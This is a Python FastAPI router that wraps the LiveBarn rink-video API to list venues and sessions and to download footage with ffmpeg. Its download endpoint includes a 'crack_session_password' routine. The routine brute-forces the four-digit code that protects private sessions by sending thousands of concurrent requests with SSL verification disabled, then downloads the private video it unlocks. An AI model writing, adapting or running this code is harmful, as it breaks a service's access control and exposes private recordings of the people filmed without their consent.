from fastapi import APIRouter, Depends, HTTPException
from fastapi.responses import JSONResponse
from typing import Annotated
from ...dependencies import has_access_token, has_surface_id, has_feed_mode, has_valid_date, has_valid_time, has_filename
from ...utils import divide_chunks
import requests
import datetime
import asyncio
import aiohttp
import json
import subprocess

url = "https://webapi.livebarn.com/api/v2.0.0"
router = APIRouter(tags=["auth"], responses={200: {"description": "Success"}})

def check_private_session(session, headers, date, time, surface_id):
    payload = {
        "privateSession": {
            "startDateTimeStr": f"{date}T00:00",
            "endDateTimeStr": f"{date}T23:59"
        },
        "surface": {
            "id": surface_id
        }
    }
    private_sessions = session.post(f"{url}/privatesession", headers=headers, json=payload)
    if private_sessions.status_code == 200:
        for private_session in private_sessions.json():
            private_session_start_date = datetime.datetime.strptime(private_session["startDateTimeStr"], "%Y-%m-%dT%H:%M")
            private_session_end_date = datetime.datetime.strptime(private_session["endDateTimeStr"], "%Y-%m-%dT%H:%M")

            if private_session_end_date.date() >= datetime.datetime.strptime(date, "%Y-%m-%d").date() >= private_session_start_date.date():
                if private_session_end_date.time() >= datetime.datetime.strptime(time, "%H:%M").time() >= private_session_start_date.time():
                    return True
        else:
            return False
    else:
        raise HTTPException(status_code=private_sessions.status_code, detail=private_sessions.text)

def get_tasks(headers, url, session, chunk):
    tasks = []
    for x in chunk:
        tasks.append(session.get(f"{url}/code/{str(x).zfill(4)}", headers=headers, verify_ssl=False))
    return tasks

async def crack_session_password(headers, url, chunk):
    async with aiohttp.ClientSession() as session:
        tasks = get_tasks(headers=headers, url=url, session=session, chunk=chunk)
        task_results = await asyncio.gather(*tasks)
        results = []
        for x in range(len(task_results)):
            try:
                results.append(await task_results[x].json())
            except json.decoder.JSONDecodeError:
                pass
        return results

def get_session_details(session, headers, session_url, feed_mode, code=None):
    if code is None:
        response = session.get(session_url, headers=headers)
    else:
        response = session.get(session_url + f"/code/{code}", headers=headers)
    if response.status_code == 200:
        sessions = [session for session in response.json() if session["feedModeId"] == int(feed_mode)]
        if not sessions:
            raise HTTPException(status_code=400, detail="No sessions found")
        session_details = sessions[0]
    else:
        raise HTTPException(status_code=response.status_code, detail=response.text)
    return session_details


@router.get("/venues")
def get_venues(access_token: Annotated[str, Depends(has_access_token)]):
    headers = {"Authorization": f"Bearer {access_token}"}
    venues = requests.get(f"{url}/staticdata/venues",  headers=headers)
    if venues.status_code == 200:
        return venues.json()
    else:
        raise HTTPException(status_code=venues.status_code, detail=venues.text)

@router.get("/surfaces")
def get_surfaces(access_token: Annotated[str, Depends(has_access_token)]):
    headers = {"Authorization": f"Bearer {access_token}"}
    surfaces = requests.get(f"{url}/staticdata/surfaces", headers=headers)
    if surfaces.status_code == 200:
        return sorted(surfaces.json(), key=lambda x: x['venue']['name'].casefold())
    else:
        raise HTTPException(status_code=surfaces.status_code, detail=surfaces.text)


@router.get("/surfaces/{surface_id}/sessions")
def get_surface_sessions(surface_id: Annotated[str, Depends(has_surface_id)], access_token: Annotated[str, Depends(has_access_token)], date: Annotated[str, Depends(has_valid_date)] ):
    headers = {"Authorization": f"Bearer {access_token}"}
    sessions = requests.get(f"{url}/media/day/surfaceid/{surface_id}/date/{date}T00:00",  headers=headers)
    possible_times = sorted([f"{str(x).zfill(2)}:00" for x in range(24)] + [f"{str(x).zfill(2)}:30" for x in range(24)])
    formatted_sessions = []
    if sessions.status_code == 200:
        for session in sessions.json():
            begin_date_str = session["beginDate"].replace(session["beginDate"].split("-")[-1], "")[:-1]
            try:
                begin_date = datetime.datetime.strptime(begin_date_str, "%Y-%m-%dT%H:%M:%S.%f")
            except ValueError:
                begin_date = datetime.datetime.strptime(begin_date_str, "%Y-%m-%dT%H:%M:%S")
            end_date = begin_date + datetime.timedelta(seconds=session["duration"] / 1000)
            for possible_time in possible_times:
                if end_date >= datetime.datetime.strptime(f"{date}T{possible_time}", "%Y-%m-%dT%H:%M") >= begin_date:
                    session["beginTime"] = possible_time
                    formatted_sessions.append(session)
                    break
        return JSONResponse(status_code=200, content=formatted_sessions)
    else:
        raise HTTPException(status_code=sessions.status_code, detail=sessions.text)

@router.post("/surfaces/{surface_id}/feed_mode/{feed_mode}/{date}/download", status_code=201)
def create_surface_session_download(access_token: Annotated[str, Depends(has_access_token)],
                                    surface_id: Annotated[str, Depends(has_surface_id)],
                                    feed_mode: Annotated[str, has_feed_mode],
                                    date: Annotated[str, Depends(has_valid_date)],
                                    time: Annotated[str, Depends(has_valid_time)],
                                    filename: Annotated[str, Depends(has_filename)]):
    global url
    with requests.Session() as session:
        headers = {"Authorization": f"Bearer {access_token}"}
        is_private_session = check_private_session(session=session, headers=headers, date=date, time=time, surface_id=surface_id)
        session_url = f"{url}/media/surfaceid/{surface_id}/feedmodeid/{feed_mode}/begindate/{date}T{time}"
        if not is_private_session:
            session_details = get_session_details(session=session, headers=headers, session_url=session_url, feed_mode=feed_mode)
        else:
            chunks = list(divide_chunks(l=[x for x in range(0, 10000)], n=1000))
            for index, chunk in enumerate(chunks):
                for index, result in enumerate(asyncio.run(crack_session_password(headers=headers, url=session_url, chunk=chunk))):
                    try:
                        if "url" in result[0]:
                            code = str(int(chunk[0]) + int(index))
                            session_details = get_session_details(session=session, headers=headers, session_url=session_url, feed_mode=feed_mode, code=code)
                            break
                    except TypeError as e:
                        print(str(e))
                        pass
                else:
                    continue
                break
        pwd_process = subprocess.Popen(["pwd"], stdout=subprocess.PIPE, text=True)
        pwd, error = pwd_process.communicate()
        combine_process = subprocess.call([f"{pwd.replace('/api', '').strip()}/ffmpeg", "-y", "-i" , f"{session_details["url"]}", "-c", "copy", f"../files/{filename}.mp4"])
        if combine_process != 0:
            raise HTTPException(status_code=500, detail="Failed to download.")
        return JSONResponse(status_code=201, content={"success": True, "filename": f"{filename}.mp4"})